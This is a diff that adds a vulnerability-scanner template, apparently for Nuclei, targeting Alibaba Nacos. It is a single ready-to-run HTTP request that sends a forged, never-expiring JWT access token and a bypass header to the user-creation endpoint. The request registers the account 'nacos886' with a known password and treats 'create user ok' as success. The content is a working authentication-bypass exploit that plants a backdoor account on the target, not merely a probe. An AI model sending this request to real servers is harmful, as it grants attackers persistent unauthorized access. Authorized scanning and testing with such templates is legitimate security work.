@@ -1,0 +1,33 @@
+id: nacos-user-add
+
+info:
+  name: nacos 任意用户添加
+  author: wintry
+  severity: high
+  description: nacos 任意用户添加.
+  tags: nacos
+  metadata:
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        serverIdentity: security
+
+        username=nacos886&password=nacos886
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "create user ok"
+          - "already exist"
+        condition: or
+
+      - type: status
+        status:
+          - 200
